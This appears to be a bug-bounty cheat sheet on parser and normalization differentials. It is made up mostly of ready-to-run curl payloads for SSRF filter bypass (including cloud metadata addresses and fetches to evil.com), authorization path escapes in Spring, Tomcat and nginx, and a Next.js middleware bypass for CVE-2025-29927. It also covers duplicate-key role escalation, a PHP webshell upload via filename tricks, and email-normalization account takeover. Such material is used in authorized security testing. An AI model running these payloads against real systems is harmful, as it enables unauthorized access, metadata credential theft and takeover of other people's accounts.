# Parser & Normalization Differentials

**Core concept:** Two components process the same input but disagree on what it means. The security control lives on Component A; the business logic lives on Component B. Send input that A reads as safe but B reads as dangerous.

**Pairs to target:** WAF↔app · CDN↔origin · gateway↔microservice · JSON validator↔ORM · email validator↔identity lookup · URL parser↔fetcher · frontend↔backend · auth middleware↔route handler

---

## §1 — URL Parsing Differentials

**Used for:** SSRF filter bypass, authz path escape, open redirect bypass, WAF bypass.

### Backslash normalization
```bash
# Browsers normalize \\ to / — WAF may not
curl "https://target.com/admin\..\\..\\etc\\passwd"
# Some frameworks treat \\ as path separator → authz check on /admin passes, /etc/passwd served
# Also: redirect=https:\\evil.com → browser follows as https://evil.com
```

### @-sign / userinfo
```bash
# URL: https://allowed.com@evil.com/path
# URL parser A (SSRF filter) sees host = allowed.com → passes
# URL parser B (actual fetch) sees host = evil.com → fetches it
curl "https://target.com/fetch?url=https://allowed.com@evil.com/"
curl "https://target.com/redirect?to=https://target.com@evil.com/"
```

### Fragment / #
```bash
# Fragment not sent to server but SSRF filters may evaluate it
# https://169.254.169.254#target.com → filter sees target.com, fetch sees 169.254.169.254
curl "https://target.com/fetch?url=https://169.254.169.254%23target.com"
# Reverse: https://target.com#@evil.com → some parsers take evil.com as host
```

### Percent-encoding + double-encoding
```bash
# %2F is / but some WAFs don't decode before matching
curl "https://target.com/api%2F..%2Fadmin"
curl "https://target.com/api%252F..%252Fadmin"   # double-encode
curl "https://target.com/api%2f%2e%2e%2fadmin"

# %5C = \ (backslash)
curl "https://target.com/api%5c..%5cadmin"

# Null byte
curl "https://target.com/api%00/admin"
```

### Short-form IP addresses (SSRF bypass)
```bash
# All resolve to 127.0.0.1 but block-lists often only check "127.0.0.1"
http://2130706433/          # decimal
http://0x7f000001/          # hex
http://0177.0.0.1/          # octal
http://127.1/               # abbreviated
http://[::1]/               # IPv6 loopback
http://[::ffff:127.0.0.1]/  # IPv4-mapped IPv6
http://[0:0:0:0:0:ffff:7f00:0001]/
http://127.0.0.1.nip.io/    # DNS resolves to 127.0.0.1

# For cloud IMDS (169.254.169.254):
http://2852039166/          # decimal
http://0xa9fea9fe/          # hex
http://169.254.169.254/     # check if SSRF filter is case/scheme sensitive
http://[::ffff:169.254.169.254]/
```

### Scheme confusion
```bash
# Uppercase scheme — some SSRF filters match lowercase only
dict://EVIL.COM:11111/
FILE:///etc/passwd
GOPHER://evil.com:70/
# Mixed case scheme
hTTp://evil.com
hTtPs://evil.com
```

---

## §2 — Path Differential (Authz Escape)

**Goal:** Auth middleware checks one path; the route handler serves another.

### Spring PathPatternParser / AntPathMatcher
```bash
# /admin/** protected by AntPathMatcher, PathPatternParser matches differently
curl https://target.com/admin;jsessionid=1/secret
curl https://target.com/admin/..;/user/data
curl https://target.com/admin/%2e%2e/user/data
curl https://target.com/admin/./secret
```

### Tomcat ..;/ (CVE-2018-1000658 class)
```bash
curl https://target.com/admin/..;/public/info
# Tomcat parses the path as /admin/../public/info = /public/info
# But the security filter sees /admin/..;/public/info → checks /admin/** → passes
curl "https://target.com/admin/..;/api/v1/users"
```

### nginx merge_slashes off + path confusion
```bash
curl https://target.com//admin
curl https://target.com/./admin
curl "https://target.com/%2f%2fadmin"
# nginx with merge_slashes off passes //admin to upstream; upstream may strip one slash and route to /admin
```

### Trailing slash + dot segment
```bash
# Auth check on exact path "/admin" — trailing slash bypasses:
curl https://target.com/admin/
curl https://target.com/admin/.
curl https://target.com/admin%20
curl https://target.com/admin%09
curl https://target.com/admin%00
```

### Next.js middleware bypass (CVE-2025-29927)
```bash
curl https://target.com/admin \
  -H "x-middleware-subrequest: middleware:middleware:middleware"
# If ≤15.2.2 and middleware handles auth: returns 200 with protected content
```

---

## §3 — Body Parsing Differentials

### JSON duplicate keys — gate reads first, ORM reads last
```bash
# Security layer (Go/Python often takes first "role")
# DB/ORM layer (Node.js/PHP often takes last "role")
curl -X POST https://target.com/api/users/update \
  -H "Content-Type: application/json" \
  -d '{"role":"user","role":"admin"}'

# Also: type coercion bypass
{"admin": true}          # bool → some frameworks coerce to string "true"
{"admin": "true"}        # string
{"admin": 1}             # int
{"admin": ["true"]}      # array
```

### HTTP Parameter Pollution (HPP)
```bash
# Different frameworks take different value when key appears twice:
# PHP: last value | Express qs: array | Flask: first value
curl "https://target.com/api?role=user&role=admin"
curl -X POST https://target.com/api -d "role=user&role=admin"
# In JSON body:
curl -X POST -d '{"role":"user"}&{"role":"admin"}'
```

### Multipart filename divergence
```bash
# Different parsing of Content-Disposition filename vs filename*
curl -X POST https://target.com/upload \
  -F 'file=@shell.php;filename="shell.jpg";filename*=UTF-8'"''shell.php"
# Some servers use filename (extension check passes: .jpg)
# Others use filename* (actual name used: .php)
```

### Content-Type confusion
```bash
# JSON endpoint that also accepts form data — skips JSON-specific auth filter:
curl -X POST https://target.com/api/admin/action \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "user_id=VICTIM&action=delete"
# The JSON body filter sees no JSON → skips → form handler processes it
```

### Charset / BOM injection
```bash
# UTF-16 BOM tricks length-based WAF signatures:
printf '\xff\xfe{"role":"admin"}' > payload.bin
curl -X POST https://target.com/api/users \
  -H "Content-Type: application/json; charset=utf-16" \
  --data-binary @payload.bin
```

---

## §4 — Identity & Email Normalization Differentials (Zero-Click ATO)

**Ceiling:** Register an account that the server maps to an existing victim account → ATO without knowing victim's password.

### Email normalization — the ATO class
```bash
# Different components normalize email differently:
# validator: victim@target.com (lowercase)
# identity lookup: Victim@Target.Com (case folded)
# Some servers: victim+tag@target.com → victim@target.com (plus-addressing stripped)
# Some servers: v.i.c.t.i.m@gmail.com = victim@gmail.com (dot-stripping)

# Test: register attacker account with normalized variant of victim email:
VICTIM: alice@target.com
REGISTER: Alice@target.com        # case variant
REGISTER: alice+bounty@target.com # plus tag
REGISTER: a.l.i.c.e@gmail.com    # dot-stripping (Gmail targets)

# Punycode / IDN confusable (zero-click ATO — documented $10.5k class, §13/25):
# Register: аlice@target.com (Cyrillic 'а' U+0430 looks like Latin 'a')
# Server normalizes to alice@target.com → same account
```

### Username / tenant slug normalization
```bash
# Auth checks on slug "admin" — but tenant is enrolled as "Admin" or "ADMIN":
curl https://target.com/api/orgs/Admin/settings \
  -H "Authorization: Bearer ATTACKER_TOKEN"
# If the authz check case-folds differently from the route lookup → access
```

### SAML entityId normalization (documented $10,500 bounty class)
```bash
# SAML SP validates audience restriction against entityId
# Some implementations trim whitespace, some normalize slashes
# Register a second SP with entityId = "https://target.com/" (trailing slash)
# Target SP's entityId = "https://target.com"
# Assertion issued for trailing-slash SP accepted by no-trailing-slash SP
```

### Identifier checked twice — check whether both normalize identically
```bash
# Pattern: auth system checks user A has access, then looks up user B via same identifier
# If the two lookups normalize differently → confused deputy
# Test: any two-step flow where the identity is read in step 1 and resolved in step 2
# e.g., JWT sub claim: "alice " (trailing space) → step 1 trims → alice's session
#        lookup: " alice" → maps to different user
```

---

## §5 — Token & Header Parsing Differentials

### Authorization header variants
```bash
# Some middleware only checks "Bearer" (case-sensitive):
curl https://target.com/api/admin -H "Authorization: bearer TOKEN"
curl https://target.com/api/admin -H "Authorization: BEARER TOKEN"
curl https://target.com/api/admin -H "Authorization: Bearer  TOKEN"  # double space
curl https://target.com/api/admin -H "Authorization: Bearer TOKEN "   # trailing space
# Duplicate headers:
curl https://target.com/api/admin \
  -H "Authorization: Bearer VALID_TOKEN" \
  -H "Authorization: Bearer MALICIOUS_TOKEN"
# First-wins vs last-wins across the stack
```

### Query vs header token routing
```bash
# API that accepts token in query string AND header — different auth paths:
curl "https://target.com/api/data?token=TOKEN"             # may skip header auth middleware
curl "https://target.com/api/data?access_token=TOKEN"
curl "https://target.com/api/data?api_key=TOKEN"
# Test: a revoked token rejected in header may be accepted in query string
```

### Content-Type routing split
```bash
# Endpoint protected for application/json but not for:
curl -X POST https://target.com/api/admin \
  -H "Content-Type: text/plain" -d '{"action":"delete_user"}'
curl -X POST https://target.com/api/admin \
  -H "Content-Type: application/x-www-form-urlencoded" -d 'action=delete_user'
curl -X POST https://target.com/api/admin \
  -H "Content-Type: application/xml" -d '<action>delete_user</action>'
```

---

## Quick Triage Checklist

For any security decision in the target's code or WAF:
1. Identify the two components: who makes the decision vs. who executes the action
2. Identify what input they share: URL, body, header, identifier
3. Send input that the decision-maker normalizes as safe but the executor processes as dangerous
4. Diff both components' behaviour — the diff is the bug

**Highest-payoff targets on well-hunted programs:**
- Email-normalization ATO (§4) — almost always untested
- JSON duplicate key role escalation (§3) — rarely tested, high value
- Spring / Tomcat path confusion (§2) — version-dependent, check stack
- SSRF filter bypass via IP short-forms and scheme confusion (§1)
